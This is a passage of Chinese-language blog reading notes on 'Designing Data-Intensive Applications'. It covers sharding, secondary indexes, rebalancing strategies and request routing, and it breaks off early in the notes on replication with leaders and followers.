<p>如果想要构建二级索引呢？</p>
<p>二级索引通常并不能唯一地标识记录，而是一种搜索记录中出现特定值的方式：</p>
<ul>
<li>查找包含词语 <code>hogwash</code> 的所有文章</li>
<li>查找所有颜色为红色的车辆等等。</li>
</ul>
<p>二级索引是关系型数据库的基础，并且在文档数据库中也很普遍。许多键值存储（如 HBase 和 Volde-mort）为了减少实现的复杂度而放弃了二级索引，但是一些（如 Riak）已经开始添加它们，因为它们对于数据模型实在是太有用了。并且二级索引也是 Solr 和 Elasticsearch 等搜索服务器的基石。</p>
<p>二级索引的问题是它们不能整齐地映射到分片。有两种用二级索引对数据库进行分片的方法：</p>
<ul>
<li><strong>本地索引：基于文档（document-based）</strong> <strong>的分片</strong></li>
<li><strong>全局索引</strong>：<strong>基于关键词（term-based）的分片</strong></li>
</ul>
<blockquote>
<p>注：书中给的 document-based、term-based 两个名词（包括 document 和 term）是从搜索中来的。由于搜索中都是 term→ document id list 的映射，document-based 是指按 document id 进行分片，每个分片存的索引都是本地的 document ids，而不管其他分片，因此是本地索引，查询时需要发到所有分片逐个查询。term-based 是指按 term 进行分片，则每个倒排索引都是存的全局的 document id list，因此查询的时候只需要去 term 所在分片查询即可。</p>
</blockquote>
<h3 id="本地索引">本地索引</h3>
<p>假设你正在经营一个销售二手车的网站（如 图 6-4 所示），每辆车包含（id、color、make、location）四元组信息，按 id 分片存储。</p>
<p>如果想让用户搜索汽车，允许他们通过颜色和厂商过滤，就需要一个在颜色（color）和厂商（make）上的次级索引。</p>
<ul>
<li>文档数据库中这些属性是 <strong>字段（field）</strong>，关系数据库中这些是 <strong>列（column）</strong></li>
</ul>
<p>如果声明了索引，则数据库可以自动执行索引。例如，无论何时将红色汽车添加到数据库，数据库分片都会自动将其添加到索引条目 <code>color:red</code> 的文档 ID 列表中。</p>
<blockquote>
<p>如果数据库仅支持键值模型，则你可能会尝试在应用程序代码中创建从属性值到主键 ID 的映射来实现次级索引。 如果沿着这条路线走下去，请万分小心，确保你的索引与底层数据保持一致。 竞争条件和间歇性写入失败（其中一些更改已保存，但其他更改未保存）很容易导致数据不同步 - 请参阅 “<strong><a href="http://ddia.vonng.com/#/ch7?id=%e5%a4%9a%e5%af%b9%e8%b1%a1%e4%ba%8b%e5%8a%a1%e7%9a%84%e9%9c%80%e6%b1%82">多对象事务的需求</a></strong>”。</p>
</blockquote>
<p><img src="fig6-4.png"></p>
<p><strong>图 6-4 基于文档的次级索引进行分片</strong></p>
<p>在这种索引方法中，每个分片是完全独立的：</p>
<ul>
<li>每个分片维护自己的次级索引，仅覆盖该分片中的文档。它不关心存储在其他分片的数据</li>
<li>无论何时你需要写入数据库（添加，删除或更新文档），只需处理包含你正在编写的文档 ID 的分片即可。出于这个原因，这种索引被称为 <strong>本地索引（local index）</strong></li>
</ul>
<p>这种索引下，如果要搜索红色汽车，则<strong>需要将查询发送到所有分片，并合并所有返回的结果</strong>。</p>
<p>这种查询分片数据库的方法有时被称为 <strong>分散 / 聚集（scatter/gather）</strong>，并且可能会使次级索引上的读取查询相当昂贵。</p>
<ul>
<li>即使并行查询分片，分散 / 聚集也容易导致尾部延迟放大（请参阅 “<strong><a href="http://ddia.vonng.com/#/ch1?id=%e5%ae%9e%e8%b7%b5%e4%b8%ad%e7%9a%84%e7%99%be%e5%88%86%e4%bd%8d%e7%82%b9">实践中的百分位点</a></strong>”）。</li>
<li>被广泛使用：MongoDB，Riak ，Cassandra ，Elasticsearch，SolrCloud 和 VoltDB 都使用文档分片次级索引。</li>
</ul>
<p>大多数数据库供应商建议你构建一个能从单个分片提供次级索引查询的分片方案，但这并不总是可行，尤其是当在单个查询中使用多个次级索引时（例如同时需要按颜色和制造商查询）。</p>
<h3 id="全局索引">全局索引</h3>
<p>相较于本地索引，<strong>全局索引</strong> 覆盖所有分片数据 ，而不仅是当前分片的数据：</p>
<ul>
<li>全局索引也必须进行分片存储多个节点上，才能分摊负载</li>
<li>全局索引可以采用与主键不同的分片方式</li>
</ul>
<p>图 6-5 中颜色、制造商为全局索引<strong>：</strong></p>
<ul>
<li>颜色：首字母从 <code>a</code> 到 <code>r</code> 的颜色在分片 0 中，<code>s</code> 到 <code>z</code> 的在分片 1。</li>
<li>汽车制造商：索引也与之类似（分片边界在 <code>f</code> 和 <code>h</code> 之间）。 <img src="fig6-5.png"> <strong>图 6-5 基于关键词对二级索引进行分片</strong></li>
</ul>
<p>这种索引也被称为 <strong>关键词分片（term-partitioned）</strong>，因为我们寻找的关键词决定了索引的分片方式。例如，一个关键词可能是：<code>color:red</code>。<strong>关键词（Term）</strong> 这个名称来源于全文搜索索引（一种特殊的次级索引），指文档中出现的所有单词。</p>
<p>和之前一样，可以通过 <strong>关键词</strong> 本身或者它的散列进行索引分片。</p>
<ul>
<li>根据关键词本身来分片对于范围扫描非常有用（例如对于数值类的属性，像汽车的报价）</li>
<li>而对关键词的哈希分片提供了负载均衡的能力。</li>
</ul>
<p>相较于本地索引，全局索引：</p>
<ul>
<li>优点：读取更高效：不需要 <strong>分散 / 收集</strong> 所有分片，客户端只需要向包含关键词的分片发出请求。</li>
<li>缺点：写入速度较慢且较为复杂，因为写入单个文档现在可能会影响索引的多个分片（文档中的每个关键词可能位于不同的分片或者不同的节点上） 。</li>
</ul>
<p>理想情况下，索引总是最新的，写入数据库的每个文档都会立即反映在索引中。但是，在关键词分片索引中，这需要跨分片的分布式事务，并不是所有数据库都支持。</p>
<p>在实践中，对全局次级索引的更新通常是 <strong>异步</strong> 的（也就是说，如果在写入之后不久读取索引，刚才所做的更改可能尚未反映在索引中）。例如，Amazon DynamoDB 声称在正常情况下，其全局次级索引会在不到一秒的时间内更新，但在基础架构出现故障的情况下可能会有延迟。</p>
<p>一些数据库，例如 Riak 的搜索功能和 Oracle 数据仓库，它允许你在本地和全局索引之间进行选择。</p>
<h2 id="重平衡rebalancing"><strong>重平衡（Rebalancing）</strong></h2>
<p>随着时间的推移，数据库会有各种变化：</p>
<ul>
<li>查询吞吐量增加：需要更多的 CPU 处理负载</li>
<li>数据集大小增加：需要更多的磁盘和 RAM 存储</li>
<li>机器出现故障：其他机器需要接管故障机器的职责</li>
</ul>
<p>所有这些更改都需要数据和请求从一个节点移动到另一个节点。 将负载从集群中的一个节点向另一个节点移动的过程称为 <strong>重平衡（rebalancing）</strong>。</p>
<p>无论使用哪种分片方案，重平衡通常都要满足一些最低要求：</p>
<ul>
<li><strong><mark style="background: #FFF3A3A6;">负载均摊</mark></strong>：重平衡之后，负载（数据存储，读取和写入请求）应该均匀分散到集群中的节点</li>
<li><strong><mark style="background: #FFF3A3A6;">可用性</mark></strong>：重平衡发生时，数据库应该继续接受读取和写入</li>
<li><strong><mark style="background: #FFF3A3A6;">最小代价</mark></strong>：节点之间只移动必须的数据，以便快速重平衡，并减少网络和磁盘 I/O 负载</li>
</ul>
<h3 id="重平衡策略">重平衡策略</h3>
<p>有多种重平衡策略，取决于一些因素，例如分片的数量、大小是否可变，如何变化。</p>
<h4 id="反面教材hash-mod-n">反面教材：hash mod N</h4>
<p>之前的做法是，将可能的散列分成不同的范围，并将每个范围分配给一个分片（例如，如果 0≤ℎ𝑎𝑠ℎ(𝑘𝑒𝑦)&lt;b0 ，则将键分配给分片 0，如果 b0≤hash (key)&lt;b1，则分配给分片 1）。</p>
<p>取模法：如果有 10 个节点，编号为 0 到 9，根据 hash % 10 的结果划分分片。 这似乎是将每个键分配给一个节点的简单方法。</p>
<p>模 N（𝑚𝑜𝑑 𝑁）方法的问题是，如果节点数量 N 发生变化，<mark style="background: #FFF3A3A6;">大多数键将需要从一个节点移动到另一个节点</mark>，同一个 hash 值 mod N 与 mod N+1 的结果通常是不同的。</p>
<ul>
<li>这违背了<mark style="background: #FFF3A3A6;">最小代价</mark>准则，即只移动必需的数据</li>
</ul>
<h4 id="一致性哈希">一致性哈希</h4>
<p><strong>一致性哈希（<a href="%5BConsistent%20hashing%20-%20Wikipedia%5D(https://en.wikipedia.org/wiki/Consistent_hashing)">consistent hashing</a>）</strong>就是为了解决这个问题，构建一个 hash 圆环，节点分散到圆环上。</p>
<ul>
<li>每个请求根据在圆环中的位置，按顺序（如顺时针）关联到下一个节点。</li>
<li>在增删节点时，只有少部分数据需要重新关联，而不像普通的取模法，几乎所有数据都需要重新映射。</li>
</ul>
<p><img src="image-20240512112755797.png"></p>
<h4 id="固定数量的分片">固定数量的分片</h4>
<p>在数据库第一次建立时确定固定数量的分片，之后不会改变。分片数量通常多于节点数量，进而并为每个节点分配多个分片。</p>
<ul>
<li>例如，运行在 10 个节点的集群上的数据库可能会从一开始就被拆分为 1,000 个分片，因此大约有 100 个分片被分配给每个节点。</li>
<li>原则上可以分割和合并分片，但固定数量的分片在操作上更简单，因此许多固定分片数据库选择不实施分片分割。</li>
</ul>
<p>分片数的权衡：</p>
<ul>
<li>分片数是可拥有的最大节点数量，需要设置足够多的分片以适应未来的增长。</li>
<li>每个分片也有管理开销，所以选择太大的数字会适得其反。</li>
</ul>
<p>当扩缩容时，发生如下的<mark style="background: #FFF3A3A6;">重平衡</mark>：</p>
<ul>
<li>如果一个节点被添加到集群中，新节点可以从当前每个节点中 <strong>窃取</strong> 一些分片，直到分片再次公平分配。这个过程如图 6-6 所示。</li>
<li>如果从集群中删除一个节点，则会发生相反的情况。 注意，这种设置下，重平衡过程中：</li>
<li>分片的数量不会改变</li>
<li>键所对应的分片也不会改变</li>
<li>唯一改变的是分片所在的节点。这种变更并不是即时的 — 在网络上传输大量的数据需要一些时间 — 所以在传输过程中，原有分片仍然会接受读写操作。 <img src="fig6-6.png"> <strong>图 6-6 将新节点添加到每个节点具有多个分片的数据库集群。</strong></li>
</ul>
<p>原则上，你甚至可以解决集群中的硬件不匹配问题：通过<mark style="background: #FFF3A3A6;">为更强大的节点分配更多的分片</mark>，可以强制这些节点承载更多的负载。在 Riak 、Elasticsearch 、Couchbase 和 Voldemort 中使用了这种重平衡的方法。</p>
<p>如果数据集的总大小难以预估（例如，可能它开始很小，但随着时间的推移会变得更大），选择正确的分片数是困难的。由于每个分片包含了总数据量固定比率的数据，因此<mark style="background: #FFF3A3A6;">每个分片的大小与集群中的数据总量成比例增长</mark>。</p>
<ul>
<li>如果分片非常大，重平衡和从节点故障恢复变得昂贵。</li>
<li>如果分片太小，则会产生太多管理开销，元信息存储开销、均衡调度开销。 当分片大小 “恰到好处” 的时候才能获得很好的性能，如果分片数量固定，但数据量变动很大，则难以达到最佳性能。</li>
</ul>
<h4 id="动态分片">动态分片</h4>
<p>对于使用键范围分片的数据库，使用固定边界、固定数量的分片将非常不便：数据分布可能随时间变化，导致数据分配不均。</p>
<ul>
<li>每次手动重新配置分片边界将非常繁琐。</li>
</ul>
<p>出于这个原因，按键的范围进行分片的数据库（如 HBase 和 RethinkDB）会动态创建分片：</p>
<ul>
<li>当<mark style="background: #FFF3A3A6;">分片增长到超过配置的大小</mark>时（在 HBase 上，默认值是 10GB），会被分成两个分片，每个分片约占一半的数据。</li>
<li>如果大量数据被删除并且分片缩小到某个阈值以下，则可以将其与相邻分片合并。此过程与 B 树 删除类似。</li>
</ul>
<p>每个分片分配给一个节点，每个节点可以处理多个分片，就像固定数量的分片一样。大型分片拆分后，可以将其中的一半转移到另一个节点，以平衡负载。在 HBase 中，分片文件的传输通过 HDFS（底层使用的分布式文件系统）来实现。</p>
<p><mark style="background: #FFF3A3A6;">动态分片的优点：分片数量与总数据量成正比</mark>。如果只有少量的数据，少量的分片就足够了，所以开销很小；如果有大量的数据，每个分片的大小被限制在一个可配置的最大值。</p>
<p>但同时，小数据量时，如果只有一个分片，会限制写入并发。因此，工程中有些数据库支持<strong>预分片</strong>（pre-splitting），如 HBase 和 MongoDB，即允许在空数据库中，配置初始分片数量下限，并确定每个分片的范围。</p>
<p>动态分片不仅适用于数据的范围分片，而且也适用于散列分片。从版本 2.4 开始，MongoDB 同时支持范围和散列分片，并且都支持动态分割分片。</p>
<h4 id="节点拥有的分片数量固定">节点拥有的分片数量固定</h4>
<p>之前提到两种方法：</p>
<ul>
<li>固定数量的分片：每个分片的大小与数据集的大小成正比。</li>
<li>动态分片：分片的数量与数据集的大小成正比，因为拆分和合并过程将每个分片的大小保持在固定的最小值和最大值之间</li>
</ul>
<p>在这两种情况下，分片的数量都与节点的数量无关。</p>
<p>Cassandra 和 Ketama 使用的第三种方法是使分片数与节点数成正比 —— 换句话说，每个节点具有固定数量的分片。在这种情况下：</p>
<ul>
<li>数据增长时：分片的大小与数据集大小成比例地增长，而节点数量保持不变</li>
<li>增加节点数时：总分片数增加，分片将变小。由于较大的数据量通常需要较大数量的节点进行存储，因此这种方法也<mark style="background: #FFF3A3A6;">使每个分片的大小较为稳定</mark>。</li>
</ul>
<p>当一个新节点加入集群时，它随机选择固定数量的现有分片进行拆分，然后占有这些拆分分片中每个分片的一半，同时将每个分片的另一半留在原地。</p>
<ul>
<li>随机化可能会产生不公平的分割，但是在更大数量的分片上平均时（在 Cassandra 中，默认情况下，每个节点有 256 个分片），新节点最终从现有节点获得公平的负载份额。</li>
<li>Cassandra 3.0 引入了另一种重平衡的算法来避免不公平的分割【29】。</li>
</ul>
<p>随机选择分片边界要求使用基于散列的分片（可以从散列函数产生的数字范围中挑选边界）。实际上，这种方法最符合一致性哈希的原始定义。最新的哈希函数可以在较低元数据开销的情况下达到类似的效果【8】。</p>
<h3 id="运维手动还是自动重平衡">运维：手动还是自动重平衡</h3>
<p>关于重平衡有一个重要问题：自动还是手动进行？</p>
<ul>
<li>全自动重平衡：系统自动决定何时将分片从一个节点移动到另一个节点，无须人工干预</li>
<li>完全手动：分片指派给节点由管理员明确配置，仅在管理员明确重新配置时才会更改</li>
<li>折中：Couchbase、Riak 和 Voldemort 会自动生成建议的分片分配，但需要管理员提交才能生效</li>
</ul>
<p>全自动重平衡可以很方便，因为正常维护的操作工作较少。然而，它可能是<mark style="background: #FFF3A3A6;">不可预测的</mark>。重平衡是一个昂贵的操作，因为它需要重新路由请求并将大量数据从一个节点移动到另一个节点。如果没有做好，这个过程可能会使网络或节点负载过重，降低其他请求的性能。</p>
<p>这种自动化与自动故障检测相结合可能十分危险。例如，假设一个节点过载，并且对请求的响应暂时很慢。其他节点得出结论：过载的节点已经死亡，并自动重新平衡集群，使负载离开它。这会对已经超负荷的节点，其他节点和网络造成额外的负载，从而使情况变得更糟，并可能导致级联失败。</p>
<p>出于这个原因，<mark style="background: #FFF3A3A6;">重平衡的过程中有人参与是一件好事</mark>。这比全自动的过程慢，但可以帮助<mark style="background: #FFF3A3A6;">防止运维意外</mark>。</p>
<h2 id="请求路由">请求路由</h2>
<p>数据集分片到多个机器上的多个节点上时，当客户想要发出请求：如何知道要连接哪个节点（ IP 地址和端口号）？</p>
<ul>
<li>核心目标是维护路由配置信息（分片 - 节点），能随着重平衡更新</li>
</ul>
<p>这是 <strong><mark style="background: #FFF3A3A6;">服务发现（service discovery）</mark></strong> 问题，它不仅限于数据库。任何可通过网络访问的软件都有这个问题，特别是如果它的目标是高可用性（在多台机器上运行冗余配置）。</p>
<ul>
<li>如果不要求高可用，直接写死一个 ip 即可，出问题手动更新</li>
</ul>
<p>概括来说，这个问题有几种不同的方案（如图 6-7 所示）:</p>
<ul>
<li><mark style="background: #FFF3A3A6;">节点转发</mark>：允许客户联系任何节点（例如，通过 <strong>循环策略的负载均衡</strong>，即 Round-Robin Load Balancer），每个节点负责将客户端请求转发到正确节点。
<ul>
<li>如果该节点恰巧拥有请求的分片，则它可以直接处理该请求；</li>
<li>否则，它将请求转发到适当的节点，接收回复并传递给客户端。</li>
</ul></li>
<li><mark style="background: #FFF3A3A6;">全局路由层</mark>：决定了应该处理客户端请求的节点，并转发。
<ul>
<li>路由层本身不处理任何请求；它仅负责分片的负载均衡。</li>
</ul></li>
<li><mark style="background: #FFF3A3A6;">客户端感知分片</mark>：要求客户端知道分片和节点的分配。在这种情况下，客户端可以直接连接到正确的节点，不需要任何中介。</li>
</ul>
<p><img src="fig6-7.png"></p>
<p><strong>图 6-7 将请求路由到正确节点的三种不同方式。</strong></p>
<p>以上所有情况中的关键问题是：作出路由决策的组件（可能是节点之一，还是路由层或客户端）如何了解分片 - 节点之间的分配关系变化？</p>
<p>这是一个具有挑战性的问题，因为重要的是所有参与者都达成<mark style="background: #FFF3A3A6;">共识（consensus）</mark> - 否则请求将被发送到错误的节点，得不到正确的处理。 在分布式系统中有达成共识的协议，但很难正确地实现。</p>
<p>许多分布式数据系统都依赖于一个<mark style="background: #FFF3A3A6;">独立的协调服务</mark>，比如 ZooKeeper 来跟踪集群元数据：</p>
<ul>
<li>每个节点在 ZooKeeper 中注册自身，ZooKeeper 维护分片到节点的可靠映射。</li>
<li>其他参与者（如路由层或分片感知客户端）可以在 ZooKeeper 中订阅此信息。</li>
<li>只要分片分配发生了改变，或者集群中添加或删除了一个节点，ZooKeeper 就会通知路由层使路由信息保持最新状态。</li>
</ul>
<p><img src="fig6-8.png"></p>
<p><strong>图 6-8 使用 ZooKeeper 跟踪分片分配给节点。</strong></p>
<p>例如，LinkedIn 的 Espresso 使用 Helix 进行集群管理（依靠 ZooKeeper），实现了如图 6-8 所示的路由层。 HBase、SolrCloud 和 Kafka 也使用 ZooKeeper 来跟踪分片分配。MongoDB 具有类似的体系结构，但它依赖于自己的<strong>配置服务器（config server）</strong> 实现和 mongos 守护进程作为路由层。</p>
<p>Cassandra 和 Riak 采取不同的方法：他们在节点之间使用 <strong>流言协议（gossip protocol）</strong> 来传播集群状态的变化。</p>
<ul>
<li>请求可以发送到任意节点，该节点会转发到包含所请求的分片的适当节点（图 6-7 中的方法 1）。</li>
<li>这个模型在数据库节点中增加了更多的复杂性，但是避免了对像 ZooKeeper 这样的外部协调服务的依赖。</li>
<li>Redis Cluster 也使用的这种方法，参考 <a href="https://redis.io/docs/latest/operate/oss_and_stack/reference/cluster-spec/">Redis cluster specification | Docs</a></li>
</ul>
<p>Couchbase 不会自动进行再平衡，这简化了设计。通常情况下，它配置了一个名为 moxi 的路由层，它会从集群节点了解路由变化。</p>
<p>当使用路由层或向随机节点发送请求时，客户端仍然需要找到要连接的 IP 地址。这些地址并不像分片的节点分布变化的那么快，所以使用 <mark style="background: #FFF3A3A6;">DNS</mark> 通常就足够了。</p>
<h3 id="执行并行查询">执行并行查询</h3>
<p>到目前为止，我们只关注简单的查询：</p>
<ul>
<li>读取或写入单个键</li>
<li>基于文档分片的次级索引场景下的分散 / 聚集查询</li>
</ul>
<p>这也是大多数 NoSQL 分布式数据存储所支持的访问层级。</p>
<p>然而，通常用于分析的 <strong>大规模并行处理（MPP, Massively parallel processing）</strong> 关系型数据库产品在其支持的查询类型方面要复杂得多。一个典型的数据仓库查询包含多个连接，过滤，分组和聚合操作。 MPP 查询优化器将复杂的查询分解成许多执行阶段和分片，其中许多可以在数据库集群的不同节点上并行执行。涉及扫描大规模数据集的查询特别受益于这种并行执行。</p>
<h2 id="本章小结">本章小结</h2>
<p>在本章中，探讨了将大数据集划分成更小的子集的不同方法。</p>
<ul>
<li>为什么要分片：数据量非常大的时候，在单台机器上存储和处理不再可行，而分片则十分必要。</li>
<li>分片的目标：在多台机器上均匀分布数据和查询负载，避免出现热点（负载不成比例的节点）。
<ul>
<li>这需要选择适合于你的数据的分片方案，并在将节点添加到集群或从集群删除时重新平衡分片。</li>
</ul></li>
</ul>
<p>讨论了两种主要的分片方法：</p>
<ul>
<li>键范围分片：其中键是有序的，并且分片拥有从某个最小值到某个最大值的所有键。
<ul>
<li>排序的优势在于可以进行<mark style="background: #FFF3A3A6;">有效的范围查询</mark>，但是如果应用程序经常访问相邻的键，则存在热点的风险。</li>
<li>在这种方法中，当分片变得太大时，通常将分片分成两个子分片来<mark style="background: #FFF3A3A6;">动态</mark>地重新平衡分片。</li>
</ul></li>
<li>散列分片：散列函数应用于每个键，分片拥有一定范围的散列。
<ul>
<li>这种方法破坏了键的排序，使得范围查询效率低下，但可以<mark style="background: #FFF3A3A6;">更均匀</mark>地分配负载。</li>
<li>通过散列进行分片时，通常先<mark style="background: #FFF3A3A6;">提前创建固定数量的分片</mark>，为每个节点分配多个分片，并在添加或删除节点时将整个分片从一个节点移动到另一个节点。也可以使用动态分片。</li>
</ul></li>
</ul>
<p>两种方法搭配使用也是可行的，例如使用<mark style="background: #FFF3A3A6;">复合主键</mark>：使用键的一部分来标识分片，而使用另一部分作为排序顺序。</p>
<p>我们还讨论了分片和次级索引之间的相互作用。次级索引也需要分片，有两种方法：</p>
<ul>
<li>基于文档分片（<mark style="background: #FFF3A3A6;">本地索引</mark>），其中次级索引存储在与主键和值相同的分片中。
<ul>
<li>写高效：只有一个分片需要在写入时更新</li>
<li>读低效：读取次级索引需要在所有分片之间进行分散 / 收集。</li>
</ul></li>
<li>基于关键词分片（<mark style="background: #FFF3A3A6;">全局索引</mark>），其中次级索引存在不同的分片中。次级索引中的条目可以包括来自主键的所有分片的记录。
<ul>
<li>写低效：当文档写入时，需要更新多个分片中的次级索引</li>
<li>读高效：可以从单个分片中进行读取</li>
</ul></li>
</ul>
<p>最后，我们讨论了将查询路由到适当的分片的技术，从简单的分片负载平衡到复杂的并行查询执行引擎。</p>
<p>按照设计，多数情况下每个分片是独立运行的 — 这就是分片数据库可以伸缩到多台机器的原因。但是，需要写入多个分片的操作结果可能难以预料：例如，如果写入一个分片成功，但另一个分片失败，会发生什么情况？我们将在事务的章节中讨论这个问题。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://ddia.qtmuniao.com/#/ch06?id=%e5%9d%87%e8%a1%a1%e7%ad%96%e7%95%a5">第六章：分片 (qtmuniao.com)</a></li>
<li><a href="http://ddia.vonng.com/#/ch6?id=%e5%86%8d%e5%b9%b3%e8%a1%a1%e7%ad%96%e7%95%a5">第六章：分片 (vonng.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
        <category>后端</category>
        <category>DDIA</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>设计数据密集型应用</tag>
        <tag>分片</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA 阅读笔记第五章：复制</title>
    <url>/blog/2024/05/08/DDIA-Note-5/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本章主要研究了复制（replication）这一技术在分布式场景下的使用，讨论了单领导者、多领导者、无领导者三种常用的变更算法，并对复制延迟相关的问题和解决方法进行了探讨。</p>
<span id="more"></span>
<h2 id="简介">简介</h2>
<p>复制（replication）意味着在通过网络连接的多台机器上保留相同数据的副本（replica），可能出于各种各样的原因：</p>
<ul>
<li>使得数据与用户在地理上接近（从而<strong>减少延迟</strong>）</li>
<li>即使系统的一部分出现故障，系统也能继续工作（从而<strong>提高可用性</strong>）</li>
<li>扩展可以接受读请求的机器数量（从而提高<strong>读取吞吐量</strong>）</li>
</ul>
<p>本章将假设数据集非常小，== 每台机器都可以保存整个数据集的副本 ==。在第 6 章中将放宽这个假设，讨论对单个机器来说太大的数据集的分片（partitioning/sharding）。</p>
<p>复制的难点在于处理复制数据的<strong>变更（change）</strong>。本章将讨论三种流行的变更复制算法：</p>
<ul>
<li><strong>单领导者（single leader）</strong></li>
<li><strong>多领导者（multi leader）</strong></li>
<li><strong>无领导者（leaderless）</strong></li>
</ul>
<p>几乎所有分布式数据库都使用这三种方法之一。</p>
<p>在复制时需要进行许多权衡：例如，<strong>使用同步复制还是异步复制？如何处理失败的副本</strong>？这些通常是数据库中的配置选项，细节因数据库而异，但原理在许多不同的实现中都类似。</p>
<h2 id="领导者与追随者"><strong>领导者与追随者</strong></h2>
<p>存储数据库拷贝的每个节点称为 <strong>副本（replica）</strong> 。</p>
<p>要确保所有数据都落在了所有的副本上，每一次向数据库的写入操作都需要传播到所有副本上。最常见的解决方案被称为 <strong>基于领导者的复制（leader-based replication）</strong> （也称<strong>主动 / 被动（active/passive）</strong> 或 <strong>主 / 从（master/slave）</strong>复制），如图 5-1 所示。它的工作原理如下：</p>
<ol type="1">
<li>副本之一被指定为 <strong>领导者（leader）</strong>，也称为 <strong>主库（master|primary）</strong> 。当客户端要向数据库写入时，它必须将请求发送给<strong>领导者</strong>，领导者会将新数据写入其本地存储。</li>
<li>其他副本被称为<strong>追随者（followers）</strong>，亦称为<strong>只读副本（read replicas）</strong>，<strong>从库（slaves）</strong>，<strong>备库（ sencondaries）</strong>，<strong>热备（hot-standby）</strong>。每当领导者将新数据写入本地存储时，它也会将<strong>数据变更</strong>发送给所有的追随者，称之为<strong>复制日志（replication log）* <em>记录或 *</em> 变更流（change stream）</strong>。每个跟随者从领导者拉取日志，并更新其本地数据库副本，按照领导者处理的相同顺序应用所有写入。</li>
<li>当客户想要从数据库中读取数据时，它可以向领导者或追随者查询。
<ol type="1">
<li>只有领导者才能接受写操作</li>
<li>从客户端的角度来看从库都是只读的</li>
</ol></li>
</ol>
<blockquote>
<p>不同的人对 <strong>热（hot）</strong>，<strong>温（warn）</strong> ， <strong>冷（cold）</strong> 备份服务器有不同的定义。 例如在 PostgreSQL 中，<strong>热备（hot standby）</strong>指的是能接受客户端读请求的副本。而<strong>温备（warm standby）</strong>只是追随领导者，但不处理客户端的任何查询。 就本书而言，这些差异并不重要。</p>
</blockquote>
<p><img src="fig5-1.png"></p>
<p><strong>图 5-1 基于领导者 (主 - 从) 的复制</strong></p>
<p>应用：</p>
<ul>
<li>这种复制模式是许多关系数据库的内置功能，如 PostgreSQL（从 9.0 版本开始），MySQL，Oracle Data Guard 【2】和 SQL Server 的 AlwaysOn 可用性组【3】。</li>
<li>它也被用于一些非关系数据库，包括 MongoDB，RethinkDB 和 Espresso 【4】。</li>
<li>基于领导者的复制并不仅限于数据库：像 Kafka 【5】和 RabbitMQ 高可用队列【6】这样的分布式消息代理也使用它。 某些网络文件系统，例如 DRBD 这样的块复制设备也与之类似。</li>
</ul>
<h3 id="同步复制与异步复制"><strong>同步复制与异步复制</strong></h3>
<p>复制系统的一个重要细节是：复制是<strong>同步（synchronously）</strong>发生还是<strong>异步（asynchronously）</strong>发生。 （在关系型数据库中这通常是一个配置项，其他系统通常硬编码为其中一个）。</p>
<p>对于用户发起的写请求：</p>
<ul>
<li>同步复制：leader 向 follower 发送复制日志后，等待 follower 的收到确认，才会响应用户</li>
<li>异步复制：leader 写入本地存储即可响应用户，无需等待 follower 确认复制日志</li>
</ul>
<p>通常情况下，复制的速度相当快：大多数数据库系统能在一秒向从库应用变更，但它们不能提供复制用时的保证。有些情况下，从库可能落后主库几分钟或更久；例如：从库正在从故障中恢复，系统在最大容量附近运行，或者如果节点间存在网络问题。</p>
<p>同步复制优劣</p>
<ul>
<li>优点：从库保证有与主库一致的最新数据副本。如果主库突然失效，我们可以确信这些数据仍然能在从库上上找到。</li>
<li>缺点：如果同步从库没有响应（比如它已经崩溃，或者出现网络故障），主库就无法处理写入操作。主库必须阻止所有写入，并等待同步副本再次可用。
<ul>
<li>将所有从库都设置为同步是不切实际的：任何一个节点的中断都会导致整个系统无法工作。</li>
</ul></li>
</ul>
<p>实际上，如果在数据库上启用同步复制，通常意味着 == 其中<strong>一个</strong>跟随者是同步的，而其他的则是异步的 ==。如果同步从库变得不可用或缓慢，则使一个异步从库同步。这保证你至少在两个节点上拥有最新的数据副本：主库和同步从库。 这种配置有时也被称为 == <strong>半同步（semi-synchronous）</strong>==【7】。</p>
<p>通常情况下，基于领导者的复制都配置为完全异步。 在这种情况下：</p>
<ul>
<li>优点：即使所有的从库都落后了，主库也可以继续处理写入。</li>
<li>缺点：如果主库失效且不可恢复，则任何尚未复制给从库的写入都会丢失。 这意味着即使已经向客户端确认成功，写入也不能保证 <strong>持久（Durable）</strong> 。</li>
</ul>
<p>弱化的持久性可能听起来像是一个坏的折衷，无论如何，异步复制已经被广泛使用了，特别当有很多追随者，或追随者异地分布时。</p>
<p>对于异步复制系统而言，主库故障时有可能丢失数据。这可能是一个严重的问题，因此研究人员仍在研究不丢数据但仍能提供良好性能和可用性的复制方法。 例如，<strong>链式复制</strong>【8,9】] 是同步复制的一种变体，已经在一些系统（如 Microsoft Azure 存储【10,11】）中成功实现。</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/344522347">System | 分布式 | Chain Replication</a></p>
</blockquote>
<h3 id="设置新从库"><strong>设置新从库</strong></h3>
<p>有时候需要设置一个新的从库：也许是为了增加副本的数量，或替换失败的节点。如何确保新的从库拥有主库数据的精确副本？</p>
<ul>
<li>简单地将数据文件从节点复制到另一节点通常是不够的：客户端不断向数据库写入数据，数据总是在不断变化。</li>
<li>可以通过锁定数据库（使其不可用于写入）来使磁盘上的文件保持一致，但是这会违背高可用的目标。</li>
</ul>
<p>拉起新的从库通常并不需要停机。从概念上讲，过程如下所示：</p>
<ol type="1">
<li>在某个时刻获取主库的一致性快照（如果可能），而不必锁定整个数据库。大多数数据库都具有这个功能，因为它是备份必需的。对于某些场景，可能需要第三方工具，例如 MySQL 的 innobackupex 【12】。</li>
<li>将快照复制到新的从库节点。</li>
<li>从库连接到主库，并拉取快照之后发生的所有数据变更。这要求快照与主库复制日志中的位置精确关联。该位置有不同的名称：例如，PostgreSQL 将其称为 <strong>日志序列号（log sequence number, LSN）</strong>，MySQL 将其称为 <strong>二进制日志坐标（binlog coordinates）</strong>。</li>
<li>当从库处理完快照之后积压的数据变更，我们说它<strong>赶上（caught up）</strong>了主库。现在它可以继续处理主库产生的数据变化了。</li>
</ol>
<p>（这就体现出 “最终一致性” 的奥妙了）</p>
<p>建立从库的实际步骤因数据库而异。在某些系统中，这个过程是完全自动化的，而在另外一些系统中，它可能是一个需要由管理员手动执行的、多步骤工作流。</p>
<h3 id="处理节点失效">处理节点失效</h3>
<h4 id="从库失效追赶恢复"><strong>从库失效：追赶恢复</strong></h4>
